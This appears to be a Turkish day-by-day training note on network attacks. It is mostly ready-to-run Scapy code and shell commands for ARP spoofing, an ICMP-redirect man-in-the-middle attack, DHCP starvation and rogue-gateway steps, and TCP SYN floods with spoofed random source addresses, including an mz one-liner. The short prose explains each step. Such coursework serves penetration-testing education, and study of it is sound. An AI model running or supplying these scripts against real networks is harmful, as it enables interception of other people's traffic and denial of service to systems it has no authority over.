##  8.Gün 28.07.2018

## Man in the Middle (MitM)

    MitM      Layer   DHCP    DNS

    Layer-2    TCP

    Layer-3    UDP

    DHCP

**ARP ile**
```

 echo 1 > /proc/sys/net/ipv4/ip_forward # Routing activation

 eth = Ether(dst="00:0c:29:fe:7b:ea",src="00:0c:29:14:3c:c8")

 arp = ARP(op=1, hwsrc="00:0c:29:14:3c:c8",psrc=<"SRC_IP">,pdst=<"DEST_IP">, hwdst=<"DEST_MAC">)

 sendp(eth/arp)
 
```

**ICMP Redirect ile**
```
# MitM against:
# - static ARP entries
# - Dynamic ARP inspection

# Prerequisites:
# echo 1 > /proc/sys/net/ipv4/ip_forward
# iptables -t nat -A POSTROUTING -s 10.100.13.0/255.255.255.0 -o tap0 -j MASQUERADE

# Creating and sending ICMP redirect packets between these entities:
#import logging
#logging.getLogger("scapy").setLevel(1)

from scapy.all import *

originalRouterIP='10.6.7.254'
attackerIP='10.6.4.90'
victimIP='10.6.6.6'
serverIP='188.132.200.17'

#Here we create an ICMP Redirect packet
ip=IP()
ip.src=originalRouterIP
ip.dst=victimIP
icmpRedirect=ICMP()
icmpRedirect.type=5
icmpRedirect.code=1
icmpRedirect.gw=attackerIP

#The ICMP packet payload /should/ :) contain the original TCP SYN packet
#sent from the victimIP
redirPayloadIP=IP()
redirPayloadIP.src=victimIP
redirPayloadIP.dst=serverIP
fakeOriginalTCPSYN=TCP()
fakeOriginalTCPSYN.flags="S"
fakeOriginalTCPSYN.dport=80
fakeOriginalTCPSYN.seq=444444444
fakeOriginalTCPSYN.sport=55555

#Release the Kraken!
while True:
        send(ip/icmpRedirect/redirPayloadIP/fakeOriginalTCPSYN)
        
```

Paket kaynak kısmını değiştirmek için iptables kullanılabilir.
```
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

**DHCP**

- DHCP servisi (yok ise kurulmalıdır) ile gateway adresini değiştirilir
- DHCP sunucusundaki havuzu doldurmak (DHCP-Starvation)

```
$ scapy
for i in range(1,255):
    mac = str(RandMAC())
    dhcpServerID="192.168.255.251"
    eth = Ether(dst="ff:ff:ff:ff:ff:ff",src=mac)
    ip  = IP(src="0.0.0.0",dst="255.255.255.255")
    ud  = UDP(sport=68,dport=67)
    bootp = BOOTP(chaddr=mac)
    dhcp = DHCP(options = [ ("message-type","request"),("requested_addr","192.168.255."+str(i)),("server_id",dhcpServerID),"end"])
    sendp(eth/ip/ud/bootp/dhcp)
```
Yukarıdaki işlemden sonra DHCP sunucusu ile IP isteği yapan hedef makinelere IP vererek trafiği incelenir.

**TCP**

TCP/DoS saldırısı daha etkili olması için TCP/SYN paketinin source IP ve port bilgileri değiştirilir. 

```
$ scapy
ip = IP(src=RandIP(),dst="0.0.0.0")
tcp = TCP(sport=RandShort(),dport=80,flags="S")
paket = ip/tcp
send(paket,loop=1)
```

mz aracı ile:
```
mz -B <IP> -t tcp "sp=1-65535, dp=80, flags=syn" -c 0
```

